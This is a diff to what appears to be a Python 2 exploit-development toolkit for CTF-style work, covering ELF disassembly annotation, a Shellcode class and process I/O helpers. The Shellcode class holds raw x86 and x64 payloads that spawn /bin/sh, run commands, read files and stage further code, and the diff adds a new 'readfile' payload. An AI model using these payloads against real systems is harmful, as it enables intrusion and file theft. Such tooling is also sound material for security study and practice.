@@ -58,6 +58,7 @@ class ELF(object):
         self._plt = {}
         self._symbol = {}
         self._load_blobs = []
+        self._string = {}
 
         regexp = {
             'section': r'^\s*\[(?P<Nr>[^\]]+)\]\s+(?P<Name>\S+)\s+(?P<Type>\S+)\s+(?P<Address>\S+)\s+(?P<Off>\S+)\s+(?P<Size>\S+)\s+(?P<ES>\S+)\s+(?P<Flg>\S+)\s+(?P<Lk>\S+)\s+(?P<Inf>\S+)\s+(?P<Al>\S+)$',
@@ -65,6 +66,7 @@ class ELF(object):
             'dynamic': r'^\s*(?P<Tag>\S+)\s+\((?P<Type>[^)]+)\)\s+(?P<Value>.+)$',
             'reloc': r'^\s*(?P<Offset>\S+)\s+(?P<Info>\S+)\s+(?P<Type>\S+)\s+(?P<Value>\S+)\s+(?P<Name>\S+)(?: \+ (?P<AddEnd>\S+))?$',
             'symbol': r'^\s*(?P<Num>[^:]+):\s+(?P<Value>\S+)\s+(?P<Size>\S+)\s+(?P<Type>\S+)\s+(?P<Bind>\S+)\s+(?P<Vis>\S+)\s+(?P<Ndx>\S+)\s+(?P<Name>\S+)',
+            'string': r'([\s\x21-\x7e]{4,})\x00',
         }
         plt_size_map = {
             'i386': (0x10, 0x10),
@@ -145,6 +147,8 @@ class ELF(object):
                     blob = f.read(filesiz)
                 is_executable = ('E' in flg)
                 self._load_blobs.append((virtaddr, blob, is_executable))
+                for m in re.finditer(regexp['string'], blob):
+                    self._string[virtaddr+m.start()] = m.group(1)
         # read Dynamic section
         while has_dynamic_section:
             line = p.stdout.readline()
@@ -293,10 +297,6 @@ class ELF(object):
         p = Popen(Asm.cmd[self.arch]['objdump'] + [self.fpath], stdout=PIPE)
         stdout, stderr = p.communicate()
 
-        p = Popen(['strings', '-tx', fpath], stdout=PIPE)
-        rev_string = dict((int16(line[:7].strip()), line[8:-1]) for line in p.stdout)
-        p.wait()
-
         rev_symbol = {}
         rev_plt = {}
         for k, v in self._symbol.iteritems():
@@ -351,9 +351,14 @@ class ELF(object):
             data_xrefs[k] = sorted(list(v))
 
         # output with annotations
-        def repl_func1(addr, color):
+        def repl_func1(addr):
             def _f(m):
+                op = m.group(1)
                 ref = int16(m.group(2))
+                if op.startswith('call'):
+                    color = 33
+                else:
+                    color = 32 if ref > addr else 35
                 return "\x1b[%dm%s%s [%+#x]\x1b[0m" % (color, m.group(1), labels[ref], ref-addr)
             return _f
 
@@ -376,9 +381,9 @@ class ELF(object):
                 continue
 
             line = re.sub(r'(call\s+)[\dA-Fa-f]+\s+<([\w@\.]+)>', '\x1b[33m\\1\\2\x1b[0m', line)
-            line = re.sub(r'(call\s+)(?:0x)?([\dA-Fa-f]+)\b.*', repl_func1(addr, 33), line)
+            line = re.sub(r'(call\s+)(?:0x)?([\dA-Fa-f]+)\b.*', repl_func1(addr), line)
             line = re.sub(r'(j\w{1,2}\s+)[\dA-Fa-f]+\s+<([\w@\.]+)>', '\x1b[32m\\1\\2\x1b[0m', line)
-            line = re.sub(r'(j\w{1,2}\s+)(?:0x)?([\dA-Fa-f]+)\b.*', repl_func1(addr, 32), line)
+            line = re.sub(r'(j\w{1,2}\s+)(?:0x)?([\dA-Fa-f]+)\b.*', repl_func1(addr), line)
             line = re.sub(r',0x([\dA-Fa-f]{3,})\b', repl_func2(36), line)
 
             expr = line.split(':', 1)[1]
@@ -387,21 +392,21 @@ class ELF(object):
             if labels[addr]:
                 if not addr in rev_symbol and not addr in rev_plt:
                     if labels[addr].startswith('loc_'):
-                        color = 32
+                        label += "\x1b[38;1m%s:\x1b[0m" % labels[addr]
+                        label = label.ljust(78+11)
                     else:
-                        color = 33
-                    label += "\x1b[%dm%s:\x1b[0m" % (color, labels[addr])
-                    label = label.ljust(78+9)
+                        label += "\x1b[33m%s:\x1b[0m" % labels[addr]
+                        label = label.ljust(78+9)
                 else:
                     label = label.ljust(78)
                 if addr in code_xrefs:
                     ary = ["%x%s" % (x, arrows[x < addr]) for x in code_xrefs[addr]]
-                    label += " \x1b[32m; CODE XREF: %s\x1b[0m" % ', '.join(ary)
+                    label += " \x1b[30;1m; CODE XREF: %s\x1b[0m" % ', '.join(ary)
                 if addr in data_xrefs:
                     ary = ["%x%s" % (x, arrows[x < addr]) for x in data_xrefs[addr]]
-                    label += " \x1b[36m; DATA XREF: %s\x1b[0m" % ', '.join(ary)
+                    label += " \x1b[30;1m; DATA XREF: %s\x1b[0m" % ', '.join(ary)
                 if addr == self._entry_point:
-                    label += ' \x1b[33m; ENTRY POINT\x1b[0m'
+                    label += ' \x1b[30;1m; ENTRY POINT\x1b[0m'
             if label:
                 print label
 
@@ -417,11 +422,8 @@ class ELF(object):
                 if ref in rev_symbol:
                     annotations.append(', '.join(rev_symbol[ref]))
 
-                for virtaddr, blob, is_exebutable in self._load_blobs:
-                    offset = ref - virtaddr
-                    if offset in rev_string:
-                        annotations.append(repr(rev_string[offset]))
-                        break
+                if ref in self._string:
+                    annotations.append(repr(self._string[ref]))
 
             if annotations:
                 print "%-70s \x1b[30;1m; %s\x1b[0m" % (line, ' '.join(annotations))
@@ -1045,9 +1047,8 @@ class Shellcode(object):
             'exec_shell': '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80',
             'exec_command': '\xeb\x29\x5e\x31\xc9\x8a\x0e\x46\x88\x2c\x0e\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe1\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x51\x53\x89\xe1\xcd\x80\xe8\xd2\xff\xff\xff',
             'dup': '\x31\xd2\x8d\x5a${fd}\x8d\x4a\x02\x8d\x42\x3f\xcd\x80\x49\x7d\xf8',
-            'cat': '\xeb\x21\x5e\x31\xc9\x8a\x0e\x46\x88\x2c\x0e\x6a\x0b\x58\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xff',
+            'readfile': '\xeb\x2d\x5b\x31\xc9\x8a\x0b\x43\x88\x2c\x0b\x31\xc9\x8d\x41\x05\xcd\x80\x93\x91\x8d\x50\x01\xc1\xe2\x0c\x6a\x03\x58\xcd\x80\x92\x6a${fd}\x5b\x6a\x04\x58\xcd\x80\x31\xdb\x8d\x43\x01\xcd\x80\xe8\xce\xff\xff\xff',
             'readdir': '\xeb\x41\x5b\x31\xc9\x8a\x0b\x43\x88\x2c\x0b\x31\xff\x31\xc9\x8d\x47\x05\xcd\x80\x93\x91\x8d\x57\x01\x8d\x47\x59\x60\xcd\x80\x87\xce\x85\xc0\x74\x17\x66\x8b\x56\x08\x8d\x4e\x0a\xc6\x04\x11\x0a\x42\x8d\x5f${fd}\x8d\x47\x04\xcd\x80\x61\xeb\xe0\x31\xdb\x8d\x47\x01\xcd\x80\xe8\xba\xff\xff\xff',
-            'sendfile': '\xeb\x29\x5b\x31\xc9\x8a\x0b\x43\x88\x2c\x0b\x31\xd2\x31\xc9\x8d\x42\x05\xcd\x80\x91\x8d\x5a${fd}\x31\xf6\x66\xf7\xd6\x8d\x42\x44\xf6\xd0\xcd\x80\x31\xdb\x8d\x42\x01\xcd\x80\xe8\xd2\xff\xff\xff',
             'read_stager': '\xeb\x0f\x59\x6a\x03\x58\x99\x89\xd3\x42\xc1\xe2\x0c\xcd\x80\xff\xe1\xe8\xec\xff\xff\xff',
             'mmap_stager': '\x6a\x5a\x58\x99\x89\xd1\x42\xc1\xe2\x0c\x51\x6a\xff\x6a\x22\x6a\x07\x52\x51\x89\xe3\xcd\x80\x91\x93\x8d\x43\x03\xcd\x80\xff\xe1',
             'alnum_stager': 'Yh3333k4dsFkDqG02DqH0D10u03P3H1o0j2B0207393s3q103a8P7l3j4s3B065k3O4N8N8O03',
@@ -1060,9 +1061,8 @@ class Shellcode(object):
             'exec_shell': '\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05',
             'exec_command': '\xeb\x31\x5e\x48\x31\xc9\x8a\x0e\x48\xff\xc6\x88\x2c\x0e\x6a\x3b\x58\x48\x99\x52\x66\x68\x2d\x63\x48\x89\xe3\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x57\x48\x89\xe7\x52\x56\x53\x57\x48\x89\xe6\x0f\x05\xe8\xca\xff\xff\xff',
             'dup': '\x6a${fd}\x5f\x6a\x02\x5e\x6a\x21\x58\x0f\x05\x48\xff\xce\x7d\xf6',
-            'cat': '\xeb\x28\x5e\x48\x31\xc9\x8a\x0e\x48\xff\xc6\x88\x2c\x0e\x6a\x3b\x58\x48\x99\x48\xbf\x2f\x62\x69\x6e\x2f\x63\x61\x74\x52\x57\x48\x89\xe7\x52\x56\x57\x48\x89\xe6\x0f\x05\xe8\xd3\xff\xff\xff',
+            'readfile': '\xeb\x33\x5f\x48\x31\xc9\x8a\x0f\x48\xff\xc7\x88\x2c\x0f\x48\x31\xf6\x6a\x02\x58\x0f\x05\x48\x97\x48\x96\x6a\x01\x5a\x48\xc1\xe2\x0c\x0f\x05\x48\x92\x6a${fd}\x5f\x6a\x01\x58\x0f\x05\x48\x31\xff\x6a\x3c\x58\x0f\x05\xe8\xc8\xff\xff\xff',
             'readdir': '\xeb\x57\x5f\x48\x31\xc9\x8a\x0f\x48\xff\xc7\x88\x2c\x0f\x48\x31\xf6\x6a\x02\x58\x0f\x05\x48\x97\x48\x96\x48\x31\xd2\x66\xf7\xd2\x6a\x4e\x58\x0f\x05\x48\x8b\x06\x48\x85\xc0\x74\x24\x66\x8b\x56\x10\x4c\x8d\x04\x16\x48\x83\xea\x14\x48\x8d\x76\x12\xc6\x04\x16\x0a\x48\xff\xc2\x6a${fd}\x5f\x6a\x01\x58\x0f\x05\x4c\x89\xc6\xeb\xd4\x48\x31\xff\x6a\x3c\x58\x0f\x05\xe8\xa4\xff\xff\xff',
-            'sendfile': '\xeb\x2e\x5f\x48\x31\xc9\x8a\x0f\x48\xff\xc7\x88\x2c\x0f\x48\x31\xf6\x6a\x02\x58\x0f\x05\x48\x96\x48\x92\x6a${fd}\x5f\x4d\x31\xd2\x41\xf7\xd2\x6a\x28\x58\x0f\x05\x48\x31\xff\x6a\x3c\x58\x0f\x05\xe8\xcd\xff\xff\xff',
             'read_stager': '\xeb\x13\x5e\x48\x31\xff\x48\x8d\x57\x01\x48\xc1\xe2\x0c\x48\x31\xc0\x0f\x05\xff\xe6\xe8\xe8\xff\xff\xff',
             'mmap_stager': '\x4d\x31\xc9\x6a\xff\x41\x58\x6a\x22\x41\x5a\x6a\x07\x5a\x49\x8d\x71\x01\x48\xc1\xe6\x0c\x48\x31\xff\x6a\x09\x58\x0f\x05\x48\x96\x48\x92\x48\x31\xc0\x0f\x05\xff\xe6',
             'alnum_stager': 'h0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M367p0h1O0A8O7p5L2x01193i4m7k08144L7m1M3K043I3A8L4V8K0m',
@@ -1107,14 +1107,11 @@ class Shellcode(object):
     def dup(self, code, fd):
         return self.get('dup', fd=chr(fd)) + code
 
-    def cat(self, path):
-        return self.get('cat') + chr(len(path)) + path
+    def readfile(self, path, fd=1):
+        return self.get('readfile', fd=chr(fd)) + chr(len(path)) + path
 
     def readdir(self, path, fd=1):
         return self.get('readdir', fd=chr(fd)) + chr(len(path)) + path
-
-    def sendfile(self, path, fd=1):
-        return self.get('sendfile', fd=chr(fd)) + chr(len(path)) + path
 
     def read_stager(self):
         return self.get('read_stager')
@@ -1228,7 +1225,14 @@ class Proc(object):
         def run_server(s, e, cmd):
             c, addr = s.accept()
             s.close()
-            p = Popen(cmd, stdin=c, stdout=c, stderr=c)
+
+            try:
+                p = Popen(cmd, stdin=c, stdout=c, stderr=c, preexec_fn=lambda: os.setsid())
+            except Exception as err:
+                c.close()
+                e.set()
+                raise err
+
             if self.debug:
                 raw_input("\x1b[32mpid %d is running, attach the debugger if needed. Hit enter key to continue...\x1b[0m" % p.pid)
             e.set()
@@ -1242,6 +1246,7 @@ class Proc(object):
 
         e = Event()
         t = Thread(target=run_server, args=(s, e, cmd))
+        t.daemon = True
         t.start()
         c = socket.create_connection(s.getsockname())
         e.wait()
@@ -1296,9 +1301,11 @@ class Proc(object):
 
     def expect(self, regexp):
         buf = ''
-        while not re.search(regexp, buf):
+        while True:
             buf += self.read(1, None)
-        return buf
+            m = re.search(regexp, buf)
+            if m:
+                return m
 
     def readline(self):
         return self.read_until('\n')
